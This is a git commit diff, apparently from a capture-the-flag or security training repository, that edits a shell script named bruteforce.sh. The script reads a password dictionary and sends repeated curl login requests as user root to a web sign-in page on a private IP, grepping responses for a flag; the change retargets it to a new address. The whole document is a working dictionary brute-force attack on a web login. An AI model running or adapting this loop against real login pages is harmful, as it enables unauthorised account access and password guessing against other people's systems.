98de4d5434849de0ea0c76905c835ef50666cf3e
root <root@localhost.localdomain>
2019-03-25 08:09:09 -0500

    added SqlInjection fail 11

--- 02_BruteForce/bruteforce.sh
+++ 02_BruteForce/bruteforce.sh
@@ -1,7 +1,7 @@
 #/bin/bash
 for line in `cat dictionnary`
 do
-#	echo $line
-	curl 'http://10.0.2.8/?page=signin&username=root&password='$line'&Login=Login#' >> trash
+	echo $line
+	curl 'http://10.11.200.162:80/?page=signin&username=root&password='$line'&Login=Login#' >> trash
 	cat trash | grep flag
 done
